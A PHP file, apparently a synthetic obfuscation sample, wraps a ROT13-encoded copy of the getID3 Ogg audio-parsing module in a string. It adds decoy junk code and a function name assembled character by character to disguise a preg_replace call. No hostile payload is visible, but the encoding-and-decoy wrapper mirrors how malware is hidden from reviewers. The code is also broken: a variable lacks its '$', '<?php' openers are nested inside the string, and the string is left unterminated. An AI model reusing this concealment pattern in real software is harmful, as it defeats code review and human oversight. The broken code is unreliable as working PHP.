<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb.btt.cuc                                        //
// zbqhyr sbe nanylmvat Btt Ibeovf, BttSYNP naq Fcrrk svyrf    //
// qrcraqrapvrf: zbqhyr.nhqvb.synp.cuc                         //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.nhqvb.synp.cuc', __SVYR__, gehr);

pynff trgvq3_btt rkgraqf trgvq3_unaqyre
{
	/**
	 * @yvax uggc://kvcu.bet/ibeovf/qbp/Ibeovf_V_fcrp.ugzy
	 *
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		$vasb['svyrsbezng'] = 'btt';

		// Jnea nobhg vyyrtny gntf - bayl ibeovfpbzzragf ner nyybjrq
		vs (vffrg($vasb['vq3i2'])) {
			$guvf->jneavat('Vyyrtny VQ3i2 gnt cerfrag.');
		}
		vs (vffrg($vasb['vq3i1'])) {
			$guvf->jneavat('Vyyrtny VQ3i1 gnt cerfrag.');
		}
		vs (vffrg($vasb['ncr'])) {
			$guvf->jneavat('Vyyrtny NCR gnt cerfrag.');
		}


		// Cntr 1 - Fgernz Urnqre

		$guvf->sfrrx($vasb['niqngnbssfrg']);

		$bttcntrvasb = $guvf->CnefrBttCntrUrnqre();
		$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']] = $bttcntrvasb;

		vs ($guvf->sgryy() >= $guvf->trgvq3->sernq_ohssre_fvmr()) {
			$guvf->reebe('Pbhyq abg svaq fgneg bs Btt cntr va gur svefg '.$guvf->trgvq3->sernq_ohssre_fvmr().' olgrf (guvf zvtug abg or na Btt-Ibeovf svyr?)');
			hafrg($vasb['svyrsbezng']);
			hafrg($vasb['btt']);
			erghea snyfr;
		}

		$svyrqngn = $guvf->sernq($bttcntrvasb['cntr_yratgu']);
		$svyrqngnbssfrg = 0;

		vs (fhofge($svyrqngn, 0, 4) == 'sYnP') {

			$vasb['nhqvb']['qngnsbezng']   = 'synp';
			$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe';
			$vasb['nhqvb']['ybffyrff']     = gehr;

		} ryfrvs (fhofge($svyrqngn, 1, 6) == 'ibeovf') {

			$guvf->CnefrIbeovfCntrUrnqre($svyrqngn, $svyrqngnbssfrg, $bttcntrvasb);

		} ryfrvs (fhofge($svyrqngn, 0, 8) == 'BchfUrnq') {

			vs ($guvf->CnefrBchfCntrUrnqre($svyrqngn, $svyrqngnbssfrg, $bttcntrvasb) === snyfr) {
				erghea snyfr;
			}

		} ryfrvs (fhofge($svyrqngn, 0, 8) == 'Fcrrk   ') {

			// uggc://jjj.fcrrk.bet/znahny/abqr10.ugzy

			$vasb['nhqvb']['qngnsbezng']   = 'fcrrk';
			$vasb['zvzr_glcr']             = 'nhqvb/fcrrk';
			$vasb['nhqvb']['ovgengr_zbqr'] = 'noe';
			$vasb['nhqvb']['ybffyrff']     = snyfr;

			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fcrrk_fgevat']           =                              fhofge($svyrqngn, $svyrqngnbssfrg, 8); // uneq-pbqrq gb 'Fcrrk   '
			$svyrqngnbssfrg += 8;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fcrrk_irefvba']          =                              fhofge($svyrqngn, $svyrqngnbssfrg, 20);
			$svyrqngnbssfrg += 20;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fcrrk_irefvba_vq']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['urnqre_fvmr']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['engr']                   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['zbqr']                   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['zbqr_ovgfgernz_irefvba'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['ao_punaaryf']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['ovgengr']                = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['senzrfvmr']              = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['ioe']                    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['senzrf_cre_cnpxrg']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['rkgen_urnqref']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['erfreirq1']              = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['erfreirq2']              = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
			$svyrqngnbssfrg += 4;

			$vasb['fcrrk']['fcrrk_irefvba'] = gevz($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fcrrk_irefvba']);
			$vasb['fcrrk']['fnzcyr_engr']   = $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['engr'];
			$vasb['fcrrk']['punaaryf']      = $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['ao_punaaryf'];
			$vasb['fcrrk']['ioe']           = (obby) $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['ioe'];
			$vasb['fcrrk']['onaq_glcr']     = $guvf->FcrrkOnaqZbqrYbbxhc($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['zbqr']);

			$vasb['nhqvb']['fnzcyr_engr']   = $vasb['fcrrk']['fnzcyr_engr'];
			$vasb['nhqvb']['punaaryf']      = $vasb['fcrrk']['punaaryf'];
			vs ($vasb['fcrrk']['ioe']) {
				$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe';
			}

		} ryfrvs (fhofge($svyrqngn, 0, 7) == \"\k80\".'gurben') {

			// uggc://jjj.gurben.bet/qbp/Gurben.cqs (frpgvba 6.2)

			$vasb['btt']['cntrurnqre']['gurben']['gurben_zntvp']             =                           fhofge($svyrqngn, $svyrqngnbssfrg,  7); // uneq-pbqrq gb \"\k80.'gurben'
			$svyrqngnbssfrg += 7;
			$vasb['btt']['cntrurnqre']['gurben']['irefvba_znwbe']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['irefvba_zvabe']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['irefvba_erivfvba']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['senzr_jvqgu_znpeboybpxf']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
			$svyrqngnbssfrg += 2;
			$vasb['btt']['cntrurnqre']['gurben']['senzr_urvtug_znpeboybpxf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
			$svyrqngnbssfrg += 2;
			$vasb['btt']['cntrurnqre']['gurben']['erfbyhgvba_k']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  3));
			$svyrqngnbssfrg += 3;
			$vasb['btt']['cntrurnqre']['gurben']['erfbyhgvba_l']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  3));
			$svyrqngnbssfrg += 3;
			$vasb['btt']['cntrurnqre']['gurben']['cvpgher_bssfrg_k']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['cvpgher_bssfrg_l']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['senzr_engr_ahzrengbe']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre']['gurben']['senzr_engr_qrabzvangbe']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
			$svyrqngnbssfrg += 4;
			$vasb['btt']['cntrurnqre']['gurben']['cvkry_nfcrpg_ahzrengbe']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  3));
			$svyrqngnbssfrg += 3;
			$vasb['btt']['cntrurnqre']['gurben']['cvkry_nfcrpg_qrabzvangbe'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  3));
			$svyrqngnbssfrg += 3;
			$vasb['btt']['cntrurnqre']['gurben']['pbybe_fcnpr_vq']           = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
			$svyrqngnbssfrg += 1;
			$vasb['btt']['cntrurnqre']['gurben']['abzvany_ovgengr']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  3));
			$svyrqngnbssfrg += 3;
			$vasb['btt']['cntrurnqre']['gurben']['syntf']                    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
			$svyrqngnbssfrg += 2;

			$vasb['btt']['cntrurnqre']['gurben']['dhnyvgl']         = ($vasb['btt']['cntrurnqre']['gurben']['syntf'] & 0kSP00) >> 10;
			$vasb['btt']['cntrurnqre']['gurben']['xst_fuvsg']       = ($vasb['btt']['cntrurnqre']['gurben']['syntf'] & 0k03R0) >>  5;
			$vasb['btt']['cntrurnqre']['gurben']['cvkry_sbezng_vq'] = ($vasb['btt']['cntrurnqre']['gurben']['syntf'] & 0k0018) >>  3;
			$vasb['btt']['cntrurnqre']['gurben']['erfreirq']        = ($vasb['btt']['cntrurnqre']['gurben']['syntf'] & 0k0007) >>  0; // fubhyq or 0
			$vasb['btt']['cntrurnqre']['gurben']['pbybe_fcnpr']     = frys::GurbenPbybeFcnpr($vasb['btt']['cntrurnqre']['gurben']['pbybe_fcnpr_vq']);
			$vasb['btt']['cntrurnqre']['gurben']['cvkry_sbezng']    = frys::GurbenCvkrySbezng($vasb['btt']['cntrurnqre']['gurben']['cvkry_sbezng_vq']);

			$vasb['ivqrb']['qngnsbezng']   = 'gurben';
			$vasb['zvzr_glcr']             = 'ivqrb/btt';
			//$vasb['nhqvb']['ovgengr_zbqr'] = 'noe';
			//$vasb['nhqvb']['ybffyrff']     = snyfr;
			$vasb['ivqrb']['erfbyhgvba_k'] = $vasb['btt']['cntrurnqre']['gurben']['erfbyhgvba_k'];
			$vasb['ivqrb']['erfbyhgvba_l'] = $vasb['btt']['cntrurnqre']['gurben']['erfbyhgvba_l'];
			vs ($vasb['btt']['cntrurnqre']['gurben']['senzr_engr_qrabzvangbe'] > 0) {
				$vasb['ivqrb']['senzr_engr'] = (sybng) $vasb['btt']['cntrurnqre']['gurben']['senzr_engr_ahzrengbe'] / $vasb['btt']['cntrurnqre']['gurben']['senzr_engr_qrabzvangbe'];
			}
			vs ($vasb['btt']['cntrurnqre']['gurben']['cvkry_nfcrpg_qrabzvangbe'] > 0) {
				$vasb['ivqrb']['cvkry_nfcrpg_engvb'] = (sybng) $vasb['btt']['cntrurnqre']['gurben']['cvkry_nfcrpg_ahzrengbe'] / $vasb['btt']['cntrurnqre']['gurben']['cvkry_nfcrpg_qrabzvangbe'];
			}
$guvf->jneavat('Btt Gurben (i3) abg shyyl fhccbegrq va guvf irefvba bs trgVQ3 ['.$guvf->trgvq3->irefvba().'] -- ovgengr, cynlgvzr naq nyy nhqvb qngn ner pheeragyl haninvynoyr');


		} ryfrvs (fhofge($svyrqngn, 0, 8) == \"svfurnq\k00\") {

			// Btt Fxryrgba irefvba 3.0 Sbezng Fcrpvsvpngvba
			// uggc://kvcu.bet/btt/qbp/fxryrgba.ugzy
			$svyrqngnbssfrg += 8;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['irefvba_znwbe']                = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
			$svyrqngnbssfrg += 2;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['irefvba_zvabe']                = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
			$svyrqngnbssfrg += 2;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['cerfragngvbagvzr_ahzrengbe']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
			$svyrqngnbssfrg += 8;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['cerfragngvbagvzr_qrabzvangbe'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
			$svyrqngnbssfrg += 8;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['onfrgvzr_ahzrengbe']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
			$svyrqngnbssfrg += 8;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['onfrgvzr_qrabzvangbe']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
			$svyrqngnbssfrg += 8;
			$vasb['btt']['fxryrgba']['svfurnq']['enj']['hgp']                          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 20));
			$svyrqngnbssfrg += 20;

			$vasb['btt']['fxryrgba']['svfurnq']['irefvba']          = $vasb['btt']['fxryrgba']['svfurnq']['enj']['irefvba_znwbe'].'.'.$vasb['btt']['fxryrgba']['svfurnq']['enj']['irefvba_zvabe'];
			$vasb['btt']['fxryrgba']['svfurnq']['cerfragngvbagvzr'] = trgvq3_yvo::FnsrQvi($vasb['btt']['fxryrgba']['svfurnq']['enj']['cerfragngvbagvzr_ahzrengbe'], $vasb['btt']['fxryrgba']['svfurnq']['enj']['cerfragngvbagvzr_qrabzvangbe']);
			$vasb['btt']['fxryrgba']['svfurnq']['onfrgvzr']         = trgvq3_yvo::FnsrQvi($vasb['btt']['fxryrgba']['svfurnq']['enj']['onfrgvzr_ahzrengbe'],         $vasb['btt']['fxryrgba']['svfurnq']['enj']['onfrgvzr_qrabzvangbe']);
			$vasb['btt']['fxryrgba']['svfurnq']['hgp']              = $vasb['btt']['fxryrgba']['svfurnq']['enj']['hgp'];


			$pbhagre = 0;
			qb {
				$bttcntrvasb = $guvf->CnefrBttCntrUrnqre();
				$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab'].'.'.$pbhagre++] = $bttcntrvasb;
				$svyrqngn = $guvf->sernq($bttcntrvasb['cntr_yratgu']);
				$guvf->sfrrx($bttcntrvasb['cntr_raq_bssfrg']);

				vs (fhofge($svyrqngn, 0, 8) == \"svfobar\k00\") {

					$svyrqngnbssfrg = 8;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['zrffntr_urnqre_bssfrg']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
					$svyrqngnbssfrg += 4;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['frevny_ahzore']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
					$svyrqngnbssfrg += 4;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['ahzore_urnqre_cnpxrgf']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
					$svyrqngnbssfrg += 4;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['tenahyrengr_ahzrengbe']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
					$svyrqngnbssfrg += 8;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['tenahyrengr_qrabzvangbe'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
					$svyrqngnbssfrg += 8;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['onfrtenahyr']             = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  8));
					$svyrqngnbssfrg += 8;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['cerebyy']                 = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
					$svyrqngnbssfrg += 4;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['tenahyrfuvsg']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
					$svyrqngnbssfrg += 1;
					$vasb['btt']['fxryrgba']['svfobar']['enj']['cnqqvat']                 =                              fhofge($svyrqngn, $svyrqngnbssfrg,  3);
					$svyrqngnbssfrg += 3;

				} ryfrvs (fhofge($svyrqngn, 1, 6) == 'gurben') {

					$vasb['ivqrb']['qngnsbezng'] = 'gurben1';
					$guvf->reebe('Btt Gurben (i1) abg pbeerpgyl unaqyrq va guvf irefvba bs trgVQ3 ['.$guvf->trgvq3->irefvba().']');
					//oernx;

				} ryfrvs (fhofge($svyrqngn, 1, 6) == 'ibeovf') {

					$guvf->CnefrIbeovfCntrUrnqre($svyrqngn, $svyrqngnbssfrg, $bttcntrvasb);

				} ryfr {
					$guvf->reebe('harkcrpgrq');
					//oernx;
				}
			//} juvyr ($bttcntrvasb['cntr_frdab'] == 0);
			} juvyr (($bttcntrvasb['cntr_frdab'] == 0) && (fhofge($svyrqngn, 0, 8) != \"svfobar\k00\"));

			$guvf->sfrrx($bttcntrvasb['cntr_fgneg_bssfrg']);

			$guvf->reebe('Btt Fxryrgba abg pbeerpgyl unaqyrq va guvf irefvba bs trgVQ3 ['.$guvf->trgvq3->irefvba().']');
			//erghea snyfr;

		} ryfrvs (fhofge($svyrqngn, 0, 5) == \"\k7S\".'SYNP') {
			// uggcf://kvcu.bet/synp/btt_znccvat.ugzy

			$vasb['nhqvb']['qngnsbezng']   = 'synp';
			$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe';
			$vasb['nhqvb']['ybffyrff']     = gehr;

			$vasb['btt']['synp']['urnqre']['irefvba_znwbe']  =                         beq(fhofge($svyrqngn,  5, 1));
			$vasb['btt']['synp']['urnqre']['irefvba_zvabe']  =                         beq(fhofge($svyrqngn,  6, 1));
			$vasb['btt']['synp']['urnqre']['urnqre_cnpxrgf'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn,  7, 2)) + 1; // \"N gjb-olgr, ovt-raqvna ovanel ahzore fvtavslvat gur ahzore bs urnqre (aba-nhqvb) cnpxrgf, abg vapyhqvat guvf bar. Guvf ahzore znl or mreb (0k0000) gb fvtavsl 'haxabja' ohg or njner gung fbzr qrpbqref znl abg or noyr gb unaqyr fhpu fgernzf.\"
			$vasb['btt']['synp']['urnqre']['zntvp']          =                             fhofge($svyrqngn,  9, 4);
			vs ($vasb['btt']['synp']['urnqre']['zntvp'] != 'sYnP') {
				$guvf->reebe('Btt-SYNP rkcrpgvat \"sYnP\", sbhaq \"'.$vasb['btt']['synp']['urnqre']['zntvp'].'\" ('.gevz(trgvq3_yvo::CevagUrkOlgrf($vasb['btt']['synp']['urnqre']['zntvp'])).')');
				erghea snyfr;
			}
			$vasb['btt']['synp']['urnqre']['FGERNZVASB_olgrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($svyrqngn, 13, 4));
			$vasb['synp']['FGERNZVASB'] = trgvq3_synp::cnefrFGERNZVASBqngn(fhofge($svyrqngn, 17, 34));
			vs (!rzcgl($vasb['synp']['FGERNZVASB']['fnzcyr_engr'])) {
				$vasb['nhqvb']['ovgengr_zbqr']    = 'ioe';
				$vasb['nhqvb']['fnzcyr_engr']     = $vasb['synp']['FGERNZVASB']['fnzcyr_engr'];
				$vasb['nhqvb']['punaaryf']        = $vasb['synp']['FGERNZVASB']['punaaryf'];
				$vasb['nhqvb']['ovgf_cre_fnzcyr'] = $vasb['synp']['FGERNZVASB']['ovgf_cre_fnzcyr'];
				$vasb['cynlgvzr_frpbaqf']         = trgvq3_yvo::FnsrQvi($vasb['synp']['FGERNZVASB']['fnzcyrf_fgernz'], $vasb['synp']['FGERNZVASB']['fnzcyr_engr']);
			}

		} ryfr {

			$guvf->reebe('Rkcrpgvat bar bs \"ibeovf\", \"Fcrrk\", \"BchfUrnq\", \"ibeovf\", \"svfuurnq\", \"gurben\", \"sYnP\" vqragvsvre fgevatf, sbhaq \"'.fhofge($svyrqngn, 0, 8).'\"');
			hafrg($vasb['btt']);
			hafrg($vasb['zvzr_glcr']);
			erghea snyfr;

		}

		// Cntr 2 - Pbzzrag Urnqre
		$bttcntrvasb = $guvf->CnefrBttCntrUrnqre();
		$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']] = $bttcntrvasb;

		fjvgpu ($vasb['nhqvb']['qngnsbezng']) {
			pnfr 'ibeovf':
				$svyrqngn = $guvf->sernq($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_yratgu']);
				$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cnpxrg_glcr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, 0, 1));
				$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fgernz_glcr'] =                              fhofge($svyrqngn, 1, 6); // uneq-pbqrq gb 'ibeovf'

				$guvf->CnefrIbeovfPbzzragf();
				oernx;

			pnfr 'synp':
				$synp = arj trgvq3_synp($guvf->trgvq3);
				vs (!$synp->cnefrZRGNqngn()) {
					$guvf->reebe('Snvyrq gb cnefr SYNP urnqref');
					erghea snyfr;
				}
				hafrg($synp);
				oernx;

			pnfr 'fcrrk':
				$guvf->sfrrx($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_yratgu'], FRRX_PHE);
				$guvf->CnefrIbeovfPbzzragf();
				oernx;

			pnfr 'bchf':
				$svyrqngn = $guvf->sernq($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_yratgu']);
				$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fgernz_glcr'] = fhofge($svyrqngn, 0, 8); // uneq-pbqrq gb 'BchfGntf'
				vs(fhofge($svyrqngn, 0, 8)  != 'BchfGntf') {
					$guvf->reebe('Rkcrpgrq \"BchfGntf\" nf urnqre ohg tbg \"'.fhofge($svyrqngn, 0, 8).'\"');
					erghea snyfr;
				}

				$guvf->CnefrIbeovfPbzzragf();
				oernx;

		}

		// Ynfg Cntr - Ahzore bs Fnzcyrf
		vs (!trgvq3_yvo::vagInyhrFhccbegrq($vasb['niqngnraq'])) {

			$guvf->jneavat('Hanoyr gb cnefr Btt raq puhax svyr (CUC qbrf abg fhccbeg svyr bcrengvbaf orlbaq '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO)');

		} ryfr {

			$guvf->sfrrx(znk($vasb['niqngnraq'] - $guvf->trgvq3->sernq_ohssre_fvmr(), 0));
			$YnfgPuhaxBsBtt = fgeeri($guvf->sernq($guvf->trgvq3->sernq_ohssre_fvmr()));
			vs ($YnfgBttFcbfgvba = fgecbf($YnfgPuhaxBsBtt, 'FttB')) {
				$guvf->sfrrx($vasb['niqngnraq'] - ($YnfgBttFcbfgvba + fgeyra('FttB')));
				$vasb['niqngnraq'] = $guvf->sgryy();
				$vasb['btt']['cntrurnqre']['rbf'] = $guvf->CnefrBttCntrUrnqre();
				$vasb['btt']['fnzcyrf']   = $vasb['btt']['cntrurnqre']['rbf']['cpz_nof_cbfvgvba'];
				vs ($vasb['btt']['fnzcyrf'] == 0) {
					$guvf->reebe('Pbeehcg Btt svyr: rbf.ahzore bs fnzcyrf == mreb');
					erghea snyfr;
				}
				vs (!rzcgl($vasb['nhqvb']['fnzcyr_engr'])) {
					$vasb['btt']['ovgengr_nirentr'] = (($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) * 8) * $vasb['nhqvb']['fnzcyr_engr'] / $vasb['btt']['fnzcyrf'];
				}
			}

		}

		vs (!rzcgl($vasb['btt']['ovgengr_nirentr'])) {
			$vasb['nhqvb']['ovgengr'] = $vasb['btt']['ovgengr_nirentr'];
		} ryfrvs (!rzcgl($vasb['btt']['ovgengr_abzvany'])) {
			$vasb['nhqvb']['ovgengr'] = $vasb['btt']['ovgengr_abzvany'];
		} ryfrvs (!rzcgl($vasb['btt']['ovgengr_zva']) && !rzcgl($vasb['btt']['ovgengr_znk'])) {
			$vasb['nhqvb']['ovgengr'] = ($vasb['btt']['ovgengr_zva'] + $vasb['btt']['ovgengr_znk']) / 2;
		}
		vs (vffrg($vasb['nhqvb']['ovgengr']) && !vffrg($vasb['cynlgvzr_frpbaqf'])) {
			vs ($vasb['nhqvb']['ovgengr'] == 0) {
				$guvf->reebe('Pbeehcg Btt svyr: ovgengr_nhqvb == mreb');
				erghea snyfr;
			}
			$vasb['cynlgvzr_frpbaqf'] = (sybng) ((($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) * 8) / $vasb['nhqvb']['ovgengr']);
		}

		vs (vffrg($vasb['btt']['iraqbe'])) {
			$vasb['nhqvb']['rapbqre'] = __sa_79955('/^Rapbqrq jvgu /', '', $vasb['btt']['iraqbe']);

			// Ibeovf bayl
			vs ($vasb['nhqvb']['qngnsbezng'] == 'ibeovf') {

				// Ibeovf 1.0 fgnegf jvgu Kvcu.Bet
				vs  (cert_zngpu('/^Kvcu.Bet/', $vasb['nhqvb']['rapbqre'])) {

					vs ($vasb['nhqvb']['ovgengr_zbqr'] == 'noe') {

						// Frg -o 128 ba noe svyrf
						$vasb['nhqvb']['rapbqre_bcgvbaf'] = '-o '.ebhaq($vasb['btt']['ovgengr_abzvany'] / 1000);

